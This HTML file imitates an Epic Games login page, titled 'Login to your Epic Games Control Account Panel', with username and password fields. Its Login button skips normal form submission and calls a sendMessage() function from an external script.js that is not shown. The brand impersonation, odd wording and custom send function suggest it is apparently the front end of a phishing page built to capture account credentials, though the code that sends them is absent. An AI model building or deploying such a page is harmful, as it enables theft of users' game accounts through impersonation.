<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Epic Games Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container">
        <div class="login-box">
            <h2>Login to your Epic Games Control Account Panel</h2>
            <form id="loginForm">
                <div class="input-group">
                    <label for="username">Username or Email</label>
                    <input type="text" id="input1" name="username" required>
                </div>
                <div class="input-group">
                    <label for="password">Password</label>
                    <input type="password" id="input2" name="password" required>
                </div>
                <button type="button" onclick="sendMessage()">Login</button>
            </form>
            <script src="script.js"></script>
            <p class="signup-link">Don't have an account? <a href="#">Sign up here</a></p>
        </div>
    </div>
</body>
</html>
